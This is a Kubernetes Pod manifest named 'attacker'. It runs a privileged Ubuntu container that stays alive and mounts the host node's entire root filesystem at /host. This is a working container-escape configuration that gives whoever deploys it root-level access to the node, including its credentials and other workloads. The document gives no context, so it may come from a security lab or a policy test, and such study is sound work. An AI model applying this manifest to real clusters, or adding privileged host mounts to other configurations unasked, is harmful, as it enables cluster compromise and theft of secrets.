apiVersion: v1
kind: Pod
metadata:
  name: attacker
spec:
  containers:
  - name: attacker
    image: ubuntu:22.04
    command:
      - sleep
      - infinity
    securityContext:
      privileged: true
    volumeMounts:
      - name: host
        mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
